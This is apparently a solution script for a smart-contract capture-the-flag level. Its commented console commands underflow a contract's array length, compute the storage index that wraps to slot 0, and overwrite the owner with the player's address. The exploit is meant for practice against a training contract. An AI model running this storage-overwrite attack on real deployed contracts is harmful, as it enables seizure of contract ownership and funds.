// use the command line with the following commands

//make contact to ensure that we pass the check contacted
await contract.makeContact()

//modify codex length by abusing underflow - opens up the maximum storage of the contract
await contract.retract()

//Calculate position, p in storage of start of codex array
p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))

//Calculate the required index, i. Use BigInt for mathematical calculations between very large numbers.
i = BigInt(2 ** 256) - BigInt(p)

//value to be put must be 32 byte, pad the player address on left with 0s to make a total of 32 byte. 
content = '0x' + '0'.repeat(24) + player.slice(2)

//Finally call revise to alter the storage slot:
await contract.revise(i, content)

//verify success by the following (output should be true)
await contract.owner() === player
